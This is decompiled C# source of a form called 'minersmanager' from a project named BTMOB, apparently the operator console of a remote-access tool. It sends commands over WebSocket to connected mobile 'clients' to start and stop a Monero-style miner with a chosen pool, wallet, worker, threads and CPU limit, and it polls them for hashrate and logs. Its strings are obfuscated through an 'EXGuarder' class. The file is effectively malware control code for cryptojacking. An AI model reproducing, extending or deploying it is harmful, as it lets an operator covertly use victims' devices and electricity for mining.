using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using BTMOB.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Web.WebView2.Core;
using Microsoft.Web.WebView2.WinForms;

namespace BTMOB;

[DesignerGenerated]
public class minersmanager : basestyle
{
	[ComVisible(true)]
	public class minersbridge
	{
		private readonly minersmanager main;

		private bool isDragging;

		public minersbridge(minersmanager f)
		{
			isDragging = false;
			main = f;
		}

		[DispId(1)]
		public void startminer(string clientId, string pool, string wallet, string worker, string thrdscont, string cpumx)
		{
			BTClient bTClient = main.getclient(clientId);
			if (bTClient != null)
			{
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add("msg", BTConst.minercommand);
				dictionary.Add("tstate", "1");
				dictionary.Add("walt", wallet);
				dictionary.Add("pol", pool);
				dictionary.Add("wrkr", worker);
				dictionary.Add("trd", thrdscont);
				dictionary.Add("cpu", cpumx);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
			}
			else
			{
				Debuger.Log_e("startminer", "Can't find client");
			}
		}

		[DispId(2)]
		public void stopminer(string clientId)
		{
			BTClient bTClient = main.getclient(clientId);
			if (bTClient != null)
			{
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add("msg", BTConst.minercommand);
				dictionary.Add("tstate", "0");
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
			}
			else
			{
				Debuger.Log_e("stopminer", "Can't find client");
			}
		}

		[DispId(3)]
		public void startdrag()
		{
			if (main == null || main.IsDisposed)
			{
				return;
			}
			if (main.InvokeRequired)
			{
				main.BeginInvoke((MethodInvoker)([SpecialName] () =>
				{
					DoDrag();
				}));
			}
			else
			{
				DoDrag();
			}
		}

		private void DoDrag()
		{
			if (isDragging)
			{
				return;
			}
			isDragging = true;
			try
			{
				Nativz.ReleaseCapture();
				Nativz.SendMessage(main.Handle, 161, 2, 0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			finally
			{
				isDragging = false;
			}
		}

		[DispId(4)]
		public void Alert(string msg)
		{
			main.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				BTAlerter.infos(msg);
			}));
		}

		[DispId(5)]
		public void requestlogs(string clientId)
		{
			BTClient bTClient = main.getclient(clientId);
			if (bTClient != null)
			{
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add("msg", BTConst.minercommand);
				dictionary.Add("tstate", "3");
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
			}
			else
			{
				Debuger.Log_e("stopminer", "Can't find client");
			}
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Refworker")]
	private BackgroundWorker _Refworker;

	public List<BTClient> listclients;

	private bool ialive;

	[field: AccessedThroughProperty("mininview")]
	internal virtual WebView2 mininview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker Refworker
	{
		[CompilerGenerated]
		get
		{
			return _Refworker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = Refworker_DoWork;
			BackgroundWorker backgroundWorker = _Refworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_Refworker = value;
			backgroundWorker = _Refworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	public minersmanager()
	{
		base.Load += minersmanager_Load;
		base.FormClosing += minersmanager_FormClosing;
		listclients = new List<BTClient>();
		ialive = true;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.minersmanager));
		this.mininview = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.Refworker = new System.ComponentModel.BackgroundWorker();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.mininview).BeginInit();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(1728, 5);
		this.minibtn.Location = new System.Drawing.Point(1770, 5);
		this.closbtn.Location = new System.Drawing.Point(1812, 5);
		this.myico.Image = BTMOB.My.Resources.Resources.coin_monero1;
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(1844, 18);
		this.mytitle.Visible = false;
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(1854, 26);
		this.mininview.AllowExternalDrop = true;
		this.mininview.CreationProperties = null;
		this.mininview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mininview.Dock = System.Windows.Forms.DockStyle.Fill;
		this.mininview.Location = new System.Drawing.Point(2, 64);
		this.mininview.Name = EXGuarder._61724F3C;
		this.mininview.Size = new System.Drawing.Size(1854, 779);
		this.mininview.TabIndex = 41;
		this.mininview.ZoomFactor = 1.0;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(1858, 845);
		base.Controls.Add(this.mininview);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._58575B08);
		base.Name = EXGuarder._45246D4E;
		this.Text = EXGuarder._45246D4E;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.mininview, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.mininview).EndInit();
		base.ResumeLayout(false);
	}

	public BTClient getclient(string tid)
	{
		return listclients.FirstOrDefault([SpecialName] (BTClient c) => Operators.CompareString(c.mobid, tid, TextCompare: false) == 0);
	}

	private async void minersmanager_Load(object sender, EventArgs e)
	{
		await mininview.EnsureCoreWebView2Async();
		string newValue = codes.locallanguage();
		string path = "ming.html";
		File.WriteAllBytes(Path.Combine(Application.StartupPath, path), Resources.miners);
		File.WriteAllText(contents: File.ReadAllText(Path.Combine(Application.StartupPath, path)).Replace("[LNG]", newValue), path: Path.Combine(Application.StartupPath, path));
		minersbridge rawObject = new minersbridge(this);
		mininview.CoreWebView2.NavigationCompleted += updateview_NavigationCompleted;
		mininview.CoreWebView2.Navigate(new Uri(Path.Combine(Application.StartupPath, path)).AbsoluteUri);
		mininview.CoreWebView2.AddHostObjectToScript("minerhost", rawObject);
	}

	private async void updateview_NavigationCompleted(object sender, CoreWebView2NavigationCompletedEventArgs e)
	{
		if (e.IsSuccess)
		{
			loadclients();
			if (!Refworker.IsBusy)
			{
				Refworker.RunWorkerAsync();
			}
		}
	}

	private void loadclients()
	{
		if (listclients.Count <= 0)
		{
			return;
		}
		foreach (BTClient listclient in listclients)
		{
			try
			{
				string javaScript = EXGuarder._14002B6C + string.Format(EXGuarder._632A413E, codes.BitmapToBase64(listclient.wallpaper)) + string.Format(EXGuarder._632A413E, listclient.name) + EXGuarder._13380968 + string.Format(EXGuarder._632A413E, listclient.Serverins.Sname) + string.Format(EXGuarder._632A413E, listclient.Serverins.Scolor) + string.Format(EXGuarder._632A413E, listclient.mobid) + EXGuarder._4A796B53;
				mininview.CoreWebView2.ExecuteScriptAsync(javaScript);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox(EXGuarder._3C23691F + ex2.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Refworker_DoWork(object sender, DoWorkEventArgs e)
	{
		while (ialive)
		{
			try
			{
				if (base.IsDisposed)
				{
					break;
				}
				if (listclients.Count > 0)
				{
					foreach (BTClient listclient in listclients)
					{
						try
						{
							if (base.IsDisposed | !ialive)
							{
								return;
							}
							Dictionary<string, object> dictionary = new Dictionary<string, object>();
							dictionary.Add(EXGuarder._2A3C4600, BTConst.minercommand);
							dictionary.Add(EXGuarder._1E1E4633, EXGuarder._74467540);
							Dictionary<string, object> chatData = dictionary;
							BTEngine.commands(chatData, listclient.mobid, listclient.Serverins.WSClient);
							Thread.Sleep(1);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							Interaction.MsgBox(EXGuarder._05346363 + ex2.Message);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(5000);
		}
	}

	private void minersmanager_FormClosing(object sender, FormClosingEventArgs e)
	{
		ialive = false;
		Refworker.Dispose();
	}

	public void updateclient(string mobid, string workerName, string wallet, string pool, string hashrate, string thestate)
	{
		if (base.InvokeRequired)
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				updateclient(mobid, workerName, wallet, pool, hashrate, thestate);
			}));
			return;
		}
		string text = string.Format(EXGuarder._3D521069, mobid) + string.Format(EXGuarder._2B273372, workerName) + string.Format(EXGuarder._2B273372, wallet) + string.Format(EXGuarder._2B273372, pool) + string.Format(EXGuarder._434E7776, hashrate);
		mininview.CoreWebView2.ExecuteScriptAsync(text + string.Format(EXGuarder._02515D4C, mobid, hashrate, thestate));
	}

	public void updatelog(string mobid, string thelog)
	{
		if (base.InvokeRequired)
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				updatelog(mobid, thelog);
			}));
		}
		else
		{
			mininview.CoreWebView2.ExecuteScriptAsync(string.Format(EXGuarder._0C2B084B, mobid, thelog));
		}
	}
}
